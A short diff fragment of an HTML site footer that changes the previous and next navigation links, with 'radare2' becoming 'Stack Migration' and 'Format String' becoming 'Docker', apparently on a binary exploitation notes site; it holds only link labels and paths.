                   Previous
                 </span>
-                radare2
+                Stack Migration
               </span>
             </div>
           </a>
         
         
-          <a href="../format_string/" title="Format String" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../../tools/docker/" title="Docker" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                Format String
+                Docker
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
